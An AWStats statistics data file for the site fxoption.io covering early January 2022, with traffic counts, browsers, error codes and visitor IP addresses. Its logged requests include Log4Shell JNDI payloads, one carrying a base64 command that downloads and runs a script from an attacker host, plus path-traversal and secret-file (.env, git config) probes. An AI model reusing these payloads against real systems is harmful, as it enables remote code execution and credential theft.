@@ -1,0 +1,980 @@
+AWSTATS DATA FILE 7.8 (build 20200416)
+# If you remove this file, all statistics for date 202201 will be lost/reset.
+# Last config file used to build this data file was /home/fcwhadm/tmp/awstats/ssl/awstats.fxoption.io.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 28
+POS_GENERAL 2011                
+POS_TIME 2692                
+POS_VISITOR 21050               
+POS_DAY 33298               
+POS_DOMAIN 3559                
+POS_LOGIN 4048                
+POS_ROBOT 4203                
+POS_WORMS 4678                
+POS_EMAILSENDER 4809                
+POS_EMAILRECEIVER 4952                
+POS_SESSION 33720               
+POS_SIDER 33922               
+POS_FILETYPES 5087                
+POS_DOWNLOADS 5346                
+POS_OS 5394                
+POS_BROWSER 5674                
+POS_SCREENSIZE 6833                
+POS_UNKNOWNREFERER 6907                
+POS_UNKNOWNREFERERBROWSER 8009                
+POS_ORIGIN 8816                
+POS_SEREFERRALS 8955                
+POS_PAGEREFS 9140                
+POS_SEARCHWORDS 9551                
+POS_KEYWORDS 9703                
+POS_MISC 2356                
+POS_ERRORS 9762                
+POS_CLUSTER 3904                
+POS_SIDER_404 9946                
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20220114080302 295 54990 3851553305402
+FirstTime 20220101014333
+LastTime 20220114075926
+LastUpdate 20220114080443 295 0 290 5 0
+TotalVisits 349                 
+TotalUnique 210                 
+MonthHostsKnown 0                   
+MonthHostsUnknown 355                 
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+FlashSupport 0 0 0
+JavascriptDisabled 0 0 0
+TotalMisc 0 0 0
+QuickTimeSupport 0 0 0
+PDFSupport 0 0 0
+JavaEnabled 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+AddToFavourites 0 0 0
+DirectorSupport 0 0 0
+RealPlayerSupport 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 12 14 747585 114 128 5269684
+1 25 26 1520357 61 70 4464314
+2 29 31 1774688 62 83 4314577
+3 20 20 1140989 63 73 4498429
+4 22 45 2344428 83 90 5768618
+5 8 9 494278 80 97 6249615
+6 11 12 677692 60 68 4125048
+7 17 40 1968330 118 133 7692518
+8 129 223 11047890 108 113 9469190
+9 45 93 4227918 108 115 9349875
+10 19 23 1113671 153 158 10029979
+11 7 11 749498 86 89 10241654
+12 90 194 10682462 241 254 16621629
+13 19 42 2083290 152 158 16249494
+14 8 9 494604 102 112 4844248
+15 7 7 423441 78 110 6134649
+16 16 16 774565 62 65 4015911
+17 11 11 665369 54 55 4358122
+18 18 42 2364158 59 70 3606085
+19 15 36 1783187 53 57 3770872
+20 12 13 692199 55 56 4142994
+21 9 10 555728 62 66 4534572
+22 11 13 800733 69 74 4239881
+23 18 19 926266 68 75 4659296
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 25 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 19
+us 426 770 39107640
+in 56 58 3419239
+ru 33 33 1919172
+gb 12 13 736519
+gr 12 12 591952
+se 9 9 545797
+cn 9 34 2089788
+nl 5 6 313835
+eu 4 4 214018
+fr 2 2 120642
+ao 2 2 121139
+es 1 1 60568
+mn 1 1 60321
+dk 1 1 60507
+ua 1 2 71563
+hk 1 6 417000
+za 1 2 71810
+mo 1 2 71563
+ca 1 1 60253
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 25 first Hits must be first (order not required for others)
+BEGIN_ROBOT 8
+curl 712 132377 20220114080302 0
+Googlebot/ 173 6380756 20220114074353 0
+no_user_agent 49 2875305 20220114040345 0
+survey 12 679592 20220108052643 0
+(firefox/)([0-9]\.|[0-1][0]\.) 12 844819 20220112133751 0
+Go\-http\-client/ 10 347067 20220110071323 0
+facebookexternalhit/ 6 334735 20220109160113 0
+Googlebot\-Image/ 3 398634 20220113155450 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 10
+png 94 7343912 0 0
+map 1 194435 0 0
+js 161 6532582 0 0
+html 347 20363646 0 0
+jpg 21 1486728 0 0
+gif 1 3716 0 0
+php 59 908373 0 0
+woff2 43 2713568 0 0
+Unknown 128 3837146 0 0
+css 104 6669220 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 0
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS ID - Hits - Pages 17
+macosx 22 2
+linuxubuntu 3 3
+linux 34 33
+macosx15 11 2
+Unknown 98 98
+winlong 1 0
+win7 44 20
+macosx6 1 0
+macosx14 2 2
+win10 722 397
+macosx9 6 6
+win8 2 2
+unix 1 1
+macosx11 8 8
+winxp 1 1
+androidoreo 2 2
+ios_iphone 1 1
+END_OS
+
+# Browser ID - Hits - Pages
+BEGIN_BROWSER 53
+mozilla 16 16
+cloudflare 8 8
+netscape5.0 21 21
+chrome20.0.1132.57 1 1
+chrome76.0.3809.111 1 1
+chrome14.0.835.163 4 0
+chrome49.0.2623.112 4 3
+chrome68.0.3440.106 1 1
+safari5.1 3 0
+chrome95.0.4638.69 3 3
+firefox60.0 3 3
+chrome19.0.1084.36 1 0
+opera11.50 6 0
+firefox65.0 2 1
+firefox90.0 1 1
+chrome70.0.3538.77 2 2
+chrome57.0.3021.104 1 1
+chrome83.0.4103.97 21 21
+chrome36.0.1985.125 3 3
+chrome56.0.2924.87 1 1
+chrome87.0.4280.88 22 2
+chrome6.0.472.33 2 0
+chrome78.0.3904.87 25 5
+chrome41.0.2228.0 1 1
+chrome60.0.3112.113 46 46
+chrome74.0.3729.131 2 2
+firefox58.0 2 2
+firefox80.0 8 0
+firefox62.0 4 4
+opera53.0.2907.99 1 1
+chrome88.0.4324.190 1 1
+chrome34.0.1847.137 10 10
+chrome66.0.3359.117 1 1
+chrome97.0.4692.71 168 36
+chrome92.0.4515.131 1 1
+chrome60.0.3112.90 1 1
+chrome78.0.3904.108 59 59
+chrome86.0.4 2 1
+chrome63.0.3239.132 5 0
+msie9.0 4 0
+edge12 26 26
+chrome42.0.2311.90 2 2
+chrome81.0.4044.138 12 12
+firefox79.0 2 2
+Unknown 54 54
+chrome96.0.4664.93 2 2
+chrome74.0.3729.157 1 1
+firefox47.0 8 8
+iphone 1 1
+chrome83.0.4103.61 2 2
+chrome83.0.4103.116 2 2
+chrome96.0.4664.110 378 205
+chrome61.0.3163.79 1 1
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 12
+Go_http_package 20220108034641
+https://gdnplus.com:Gather_Analyze_Provide. 20220101014333
+Mozilla/5.0_(compatible;_CensysInspect/1.1;__https://about.censys.io/) 20220114040346
+NetSystemsResearch_studies_the_availability_of_various_services_across_the_internet._Our_website_is_netsystemsresearch.com 20220112025600
+Mozilla/5.0 20220112123434
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xODQuMTY4LjEyMS4xODE6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE4NC4xNjguMTIxLjE4MTo0NDMpfGJhc2g=} 20220103042845
+Expanse_indexes_the_network_perimeters_of_our_customers._If_you_have_any_questions_or_concerns,_please_reach_out_to:_scaninfo@expanseinc.com 20220112045549
+python-requests/2.26.0 20220109210629
+Cloudflare-SSLDetector 20220108163106
+Mozilla/5.0_zgrab/0.x 20220113155836
+python-requests/2.23.0 20220104165106
+Mozilla/5.0_(compatible;_InternetMeasurement/1.0;__https://internet-measurement.com/) 20220111230335
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 7
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xODQuMTY4LjEyMS4xODE6NDQzfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE4NC4xNjguMTIxLjE4MTo0NDMpfGJhc2g=} 20220103042845
+Expanse_indexes_the_network_perimeters_of_our_customers._If_you_have_any_questions_or_concerns,_please_reach_out_to:_scaninfo@expanseinc.com 20220112045549
+python-requests/2.26.0 20220109210629
+python-requests/2.23.0 20220104165106
+https://gdnplus.com:Gather_Analyze_Provide. 20220101014333
+Go_http_package 20220108034641
+NetSystemsResearch_studies_the_availability_of_various_services_across_the_internet._Our_website_is_netsystemsresearch.com 20220112025600
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 356 375
+From1 2 2
+From2 5 6
+From3 6 44
+From4 209 532
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 2
+www_google_com 3 4
+www_google_com_hk 2 2
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 25 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 8
+http://184.168.121.181:80 2 2
+https://l.facebook.com 2 2
+https://184.168.121.181/change 1 1
+https://184.168.121.181/change/+$(this).val() 1 1
+https://184.168.121.181 0 10
+https://mail.fxoption.io 0 10
+https://184.168.121.181/1 0 14
+https://mail.fxoption.io/1 0 4
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 25 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 8
+301 57 13769
+404 678 827701
+419 2 2408
+405 307 61604103
+302 41 16394
+421 1 322
+500 256 84192119
+401 31 1153
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referrer
+BEGIN_SIDER_404 195
+/store/rss/order/new 1 -
+/m3/cssx/index-1.css 1 -
+/static/index/js/lk/order.js 1 -
+/shop/errors/503.php 1 -
+/downloader/index.php 1 -
+/flu/403.html 2 -
+/magento/errors/503.php 1 -
+/dev/rss/catalog/review 1 -
+/test/rss/catalog/review 1 -
+/OTApp/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/demo/rss/catalog/review 1 -
+/fx-option.png 1 -
+/webfig 1 https://184.168.121.181/webfig/
+/production/.env 1 -
+/owa/auth/x.js 9 -
+/tokenlite_app/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/cgi-bin/../../../../bin/sh 11 -
+/demo/downloader/index.php 1 -
+/vision/packageinfo.txt 1 -
+/truffle-config.js 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/shop/index.php/admin 1 -
+/phpinfo.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/static/home/mobile/js/index/index.css 1 -
+/node/add 2 https://fxoption.io/
+/demo/errors/503.php 1 -
+/assets/js/platform/popper.min.js 1 -
+/nmaplowercheck1641672196 1 -
+/shop/downloader/index.php 1 -
+/.git/HEAD 8 -
+/staging/downloader/index.php 1 -
+/test/index.php/admin 1 -
+/.git/config 1 -
+/mobile 1 https://184.168.121.181/mobile/
+/server/credentials.js 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/staging/errors/503.php 1 -
+/robots.txt 33 -
+/evox/about 3 -
+/demo/index.php/admin 1 -
+/smartbi/vision/packageinfo.txt 1 -
+/l.php 1 -
+/sitemap.xml 9 -
+/cgi-bin/config.exp 1 -
+/assets/version2/js/slide.js 1 -
+/dev/rss/order/new 1 -
+/test/errors/503.php 1 -
+/api-v2/.env 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/enev.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/remote/login 1 -
+/shop/rss/catalog/review 1 -
+/laravel/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/backend/.env 5 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/kyc/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/a.php 1 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/magento/rss/order/new 1 -
+/.env.production 3 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/ecp/proxyLogon.ecp 1 -
+/ 1 -
+/pcweb/static/css/main.e5ee9b2df05fc2d310734b11cc8c911e.css 1 -
+/stalker_portal/c/version.js 2 -
+/store/rss/catalog/notifystock 1 -
+/static/lib/Hui-iconfont/1.0.8/iconfont.css 1 -
+/old/errors/503.php 1 -
+/nmaplowercheck1641388803 1 -
+/.env 78 -
+/rss/catalog/review 1 -
+/Autodiscover/Autodiscover.xml 13 -
+/Chitoge.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/staging/rss/catalog/notifystock 1 -
+/fuel 1 -
+/staging/index.php/admin 1 -
+/test/downloader/index.php 1 -
+/public/.env 1 -
+/Public/mobile/js/config.js 1 -
+/home/login/index.html 1 -
+/old/downloader/index.php 1 -
+/static_new6/js/manifest.3ad1d5771e9b13dbdad2.js 1 -
+/${jndi:ldap://121.140.99.236:1389/Exploit} 1 -
+/magento/index.php/admin 1 -
+/resource/home/css/person.css 1 -
+/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/stream/live.php 2 -
+/node_modules 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/old/index.php/admin 1 -
+/dist/static/tradeview/charting_library/charting_library.min.js 1 -
+/config.env 1 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/config.js 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/kcfinder/browse.php 3 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/Public/Wap/jinrong/Mobile/Public/css/ucenter.css 1 -
+/static/home/js/rooms.js 1 -
+/adindex.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/admin/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/tokenlite/tokenlite_app/.env 2 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/owa/auth/logon.aspx 22 -
+/actuator/health 13 -
+/staging/rss/order/new 1 -
+/assets/version2/2_files/index.css 1 -
+/solr 1 https://184.168.121.181/solr/#/
+/beta/.env 5 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/remote/fgt_lang 1 -
+/resources/js/way.min.js 1 -
+/old/rss/order/new 1 -
+/prod/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/demo/rss/catalog/notifystock 1 -
+/user/register 2 https://fxoption.io/register
+/dev/rss/catalog/notifystock 1 -
+/api/v1 1 -
+/shop/rss/order/new 1 -
+/_profiler/phpinfo 5 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/tpl/Public/js/func.js 1 -
+/cgi-bin/../../../../../../../../../etc/passwd 1 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/application/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/admin.zip 1 -
+/Telerik.Web.UI.WebResource.axd 1 -
+/fronted/.env 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/_ignition/execute-solution 15 -
+/allow_redirects.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/Ujj3 1 -
+/mifs/. 11 https://184.168.121.181:443
+/truffle.js 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+//QeeB 3 -
+/static/home/css/creative.css 1 -
+/config/config.js 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/Public/Qts/Home/css/pchome.css 2 -
+/app/.env 5 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/api/.env 10 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/system_api.php 2 -
+/admin/index.php 1 -
+/server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/c/version.js 2 -
+/store/rss/catalog/review 1 -
+/Public/admin/hplus/css/login.min.css 1 -
+/puki.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/demo/rss/order/new 1 -
+/qPa: 1 -
+/rss/order/new 1 -
+/HNAP1 3 -
+/console 5 https://184.168.121.181:443/console/
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 30 -
+/staging/rss/catalog/review 1 -
+/app.zip 1 -
+/static/home/mobile/css/new_page.css 1 -
+/Public/admin/hplus/css/bootstrap.min.css 1 -
+/.well-known/security.txt 10 -
+/owa 1 https://184.168.121.181/owa/
+/telescope/requests 2 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/old/rss/catalog/review 1 -
+/resolve 2 -
+/application/.env 6 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/tpl/Public/js/layer_mobile2/layer.js 1 -
+/frontend/.env 14 -
+/test/rss/order/new 1 -
+/magento/downloader/index.php 1 -
+/.env.save 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/old/rss/catalog/notifystock 1 -
+/Public/Wap/jinrong/Mobile/weiyun/css/index.css 1 -
+/adminer.php 1 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/tsconfig.json 2 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+///remote/fgt_lang 1 -
+/static/index/js/lk/user.js 1 -
+/token/tokenlite/tokenlite_app/.env 2 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/static/home/css/financing.css 1 -
+/store/downloader/index.php 1 -
+/core/.env 19 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/errors/503.php 1 -
+/test/rss/catalog/notifystock 1 -
+/debug/default/view 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/old/.env 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/server/.env 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/query 2 -
+/store/index.php/admin 1 -
+/./RestAPI/LogonCustomization 1 -
+/1 14 -
+/dev/index.php/admin 1 -
+/new/.env 5 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application 22 -
+/dev/downloader/index.php 1 -
+/store/errors/503.php 1 -
+/ReportServer 2 -
+/larva.php 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/bag2 3 -
+/magento/rss/catalog/notifystock 1 -
+/rss/catalog/notifystock 1 -
+/magento/rss/catalog/review 1 -
+/.env.example 1 /
+/resources/main/index.js 1 -
+/streaming/clients_live.php 2 -
+/dns-query 2 -
+/assets/images/seo/61d6aae4c770f1641458404.jpg 4 -
+/text4041641513590 1 -
+/dev/errors/503.php 1 -
+/api/upload 1 -
+/.env.bak 1 /
+/server.js 4 please%20secure%20your%20web%20because%20this%20a%20like%20bad%20bot%20to%20crawl%20malicious%20code%20in%20your%20web
+/icons/sphere1.png 1 -
+/shop/rss/catalog/notifystock 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 25 first Hits must be first (order not required for others)
+BEGIN_VISITOR 355
+45.146.165.37 52 52 3145461 20220114075926 20220114075926 /index.php
+172.68.254.45 35 36 794402 20220106122214
+162.158.179.244 27 27 868248 20220106094324
+94.232.46.171 26 26 1495756 20220103080744
+172.68.254.65 20 22 783345 20220106125256
+162.158.179.70 17 17 479956 20220106123545
+162.158.178.43 16 18 513729 20220106084329
+172.68.254.123 16 16 474643 20220106083832
+54.163.218.197 13 13 784173 20220114014824
+195.54.160.149 9 9 545797 20220103042845
+162.158.179.42 9 10 321364 20220106123945
+162.158.178.15 8 8 277980 20220106124533
+162.158.178.179 8 8 185521 20220106125705
+162.158.178.121 7 7 581791 20220113043759
+172.68.91.143 7 16 1230349 20220111081420
+172.68.91.135 6 19 1039033 20220110122451
+162.158.179.240 6 8 88234 20220113043759
+172.68.254.31 6 6 199364 20220106104831
+162.158.179.250 6 8 670800 20220113043759
+193.118.53.194 6 6 362671 20220109101016
+172.68.253.11 6 6 318370 20220108125623
+139.180.157.168 6 6 362850 20220109210629
+128.14.134.134 5 5 302594 20220108041442
+162.158.107.10 4 4 241184 20220105021943
+148.153.51.249 4 4 49166 20220104165106
+183.136.225.9 1 2 71814 20220103092904
+45.129.56.200 1 1 60561 20220103041241
+162.158.178.232 1 1 60321 20220111102851
+209.141.35.128 0 1 34163 
+172.68.253.65 0 1 11531 
+172.68.254.157 0 7 288668 
+209.141.41.193 1 3 123057 20220111093325
+211.65.130.200 0 1 2621 
+211.138.170.70 0 1 160409 
+162.158.178.189 0 6 538374 
+172.68.254.21 0 1 72903 
+139.162.215.70 1 1 60568 20220105213340
+162.158.178.7 2 2 61382 20220106125920
+162.158.106.65 1 1 60295 20220101030618
+162.158.178.77 0 1 365341 
+162.158.119.116 0 1 3717 
+222.79.48.206 0 1 160409 
+154.209.125.33 2 2 121139 20220105142945
+172.70.82.235 0 1 5756 
+192.241.209.16 1 1 10115 20220111235752
+162.158.179.55 1 3 361684 20220106083017
+92.118.160.57 1 1 60185 20220110140517
+172.70.91.94 1 1 5852 20220111103131
+162.158.179.234 0 1 3716 
+162.158.119.160 0 1 966 
+45.83.64.159 0 1 11242 
+1.28.132.252 0 1 160409 
+92.118.160.17 1 1 60641 20220103122952
+162.142.125.195 1 1 60569 20220102153320
+162.158.106.125 2 2 120590 20220104024411
+108.162.229.203 1 1 60235 20220106230353
+162.158.179.57 1 1 60568 20220104211817
+108.162.215.109 1 1 60321 20220112220721
+172.68.253.71 0 2 178956 
+172.68.254.17 0 1 43304 
+125.76.177.162 0 1 160409 
+162.158.179.172 0 6 204978 
+185.220.101.52 1 1 60568 20220106030345
+162.158.179.21 0 1 128588 
+172.68.253.67 0 2 31646 
+134.209.248.150 1 1 60321 20220109114455
+34.86.35.2 1 1 61409 20220107084213
+172.70.82.113 2 2 61328 20220110191039
+92.118.160.13 3 3 136615 20220108034641
+162.158.179.220 0 10 41168 
+162.158.178.83 0 6 249030 
+162.158.179.123 1 7 80352 20220106083017
+162.158.187.90 1 1 60321 20220109013259
+46.166.139.111 1 1 60321 20220108185330
+34.96.130.16 1 1 38104 20220106203646
+162.158.179.152 0 1 62477 
+162.158.178.61 0 2 205068 
+167.248.133.113 1 1 60321 20220111182826
+172.68.253.7 0 1 45989 
+162.158.179.59 0 7 172993 
+205.185.122.184 0 2 62684 
+172.68.254.175 0 1 3717 
+209.141.36.112 1 2 122159 20220111093335
+159.226.95.52 0 1 2621 
+71.6.135.131 2 4 143375 20220109004231
+172.70.210.249 0 1 3733 
+34.77.162.29 1 1 60389 20220111200528
+172.68.253.49 1 1 96752 20220106083017
+178.32.197.92 1 1 60321 20220107171821
+172.68.254.159 0 2 144966 
+162.158.107.200 3 3 180886 20220105020917
+162.158.179.232 2 2 169544 20220106123351
+141.101.76.165 1 1 60049 20220111223617
+162.158.178.226 0 1 160120 
+162.158.119.204 0 1 62477 
+172.70.82.229 0 1 153357 
+172.70.211.28 0 1 5756 
+172.70.82.109 0 1 18486 
+34.77.162.15 1 1 61656 20220104160952
+162.158.119.94 1 1 12900 20220111081425
+80.82.77.33 2 3 132373 20220101213324
+66.240.236.109 2 2 120828 20220113155836
+162.158.179.7 0 2 834048 
+162.158.119.80 0 1 5756 
+209.141.42.155 0 1 18486 
+162.158.179.38 0 4 167004 
+162.158.179.236 0 1 61770 
+172.69.68.241 1 1 60049 20220110055033
+60.217.75.69 2 2 120893 20220112123434
+162.158.179.44 0 8 28662 
+192.241.206.177 1 1 60321 20220113064222
+172.69.71.45 1 1 60321 20220108114209
+172.68.254.127 0 1 86927 
+172.70.82.129 0 1 34163 
+172.70.82.209 0 1 86927 
+34.86.35.8 1 1 38092 20220104185951
+172.68.254.75 2 2 27168 20220106123350
+172.70.130.175 1 1 60295 20220101100210
+172.68.254.125 0 6 5796 
+185.173.35.33 1 1 60568 20220104065740
+162.158.179.36 0 1 78371 
+92.118.160.37 2 2 76196 20220102122537
+185.180.143.79 2 2 120889 20220114002058
+108.162.238.136 1 1 60563 20220101211030
+162.158.178.67 1 8 538196 20220107012457
+162.158.119.78 0 1 128803 
+172.70.82.193 0 1 128803 
+162.158.179.82 0 6 110916 
+34.86.35.29 1 1 61655 20220101021515
+180.149.125.163 1 1 60321 20220107174332
+162.158.119.222 0 1 3321 
+192.241.195.123 1 1 60568 20220103182905
+172.68.253.51 0 2 102984 
+172.70.211.2 0 1 3321 
+128.14.209.162 4 4 241778 20220108102944
+162.158.178.65 0 2 320806 
+172.70.210.165 2 3 125988 20220109183510
+172.70.211.92 1 1 96752 20220109183512
+172.70.82.253 0 1 41505 
+172.68.254.35 0 1 65199 
+162.158.179.27 0 1 35563 
+209.141.51.49 0 1 966 
+45.83.66.111 1 1 60568 20220105143501
+193.37.255.114 1 2 71563 20220111010743
+172.70.210.211 0 1 8845 
+162.158.129.61 1 1 33357 20220107233557
+192.3.67.177 1 1 60507 20220107035232
+172.70.178.15 1 1 60298 20220101124146
+162.158.179.40 0 1 159839 
+108.162.246.224 2 2 120588 20220102021918
+172.70.82.161 0 1 9146 
+104.140.188.26 1 1 60570 20220101014333
+92.118.160.61 1 1 60389 20220110160853
+162.158.106.35 1 1 60321 20220108163105
+23.251.102.82 2 2 120642 20220113132855
+172.68.91.131 0 10 228584 
+172.70.211.128 0 1 62477 
+162.158.179.231 4 4 138990 20220106124955
+128.14.134.170 1 1 60507 20220107045919
